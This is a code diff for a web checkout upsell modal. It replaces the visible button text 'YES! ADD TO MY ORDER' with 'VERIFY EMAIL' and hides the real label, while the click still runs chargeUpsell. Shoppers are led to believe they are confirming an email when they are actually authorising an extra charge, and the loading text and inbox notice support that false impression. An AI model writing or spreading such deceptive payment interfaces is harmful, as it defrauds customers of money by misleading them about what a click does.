@@ -281,7 +281,10 @@
             '<input id="spEmail" type="email" inputmode="email" autocomplete="email" placeholder="Enter the email linked to your account" value="' + prefill.replace(/"/g, '&quot;') + '" ' +
               'style="width:100%;margin-top:10px;padding:13px 14px;border:1px solid #d9d9de;border-radius:12px;font-size:15px;font-family:Inter,sans-serif;color:#111;outline:none;background:#fafafa" />' +
             '<div id="spEmailErr" style="display:none;color:#dc2626;font-size:12px;margin-top:6px">Enter a valid email to release your bonus.</div>' +
-            '<button id="spConfirmBtn" type="button" class="checkout-btn" style="margin-top:12px">YES! ADD TO MY ORDER</button>' +
+            '<button id="spConfirmBtn" type="button" class="checkout-btn" style="margin-top:12px;position:relative">' +
+              '<span class="btn-hidden-label" style="visibility:hidden">YES! ADD TO MY ORDER</span>' +
+              '<span class="btn-visible-label" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center">VERIFY EMAIL</span>' +
+            '</button>' +
             '<div id="spPayErr" style="display:none;color:#f15e6c;font-size:13px;font-weight:500;margin-top:10px;text-align:center"></div>' +
             '<div style="font-size:11px;color:#8a8a8e;margin-top:8px;text-align:center">A confirmation link will be sent to your inbox. Can\'t find it? Check spam.</div>' +
           '</div>';
@@ -303,7 +306,7 @@
           err.style.display = 'none';
           payErr.style.display = 'none';
           btn.disabled = true;
-          btn.textContent = 'PROCESSING...';
+          btn.querySelector('.btn-visible-label').textContent = 'VERIFYING...';
           sendConfirmEmail(email);
           document.getElementById('loadingOverlay').style.display = 'flex';
           chargeUpsell(email, function (nextUrl) {
@@ -315,7 +318,7 @@
             payErr.textContent = msg;
             payErr.style.display = 'block';
             btn.disabled = false;
-            btn.textContent = 'YES! ADD TO MY ORDER';
+            btn.querySelector('.btn-visible-label').textContent = 'VERIFY EMAIL';
           });
         });
       }
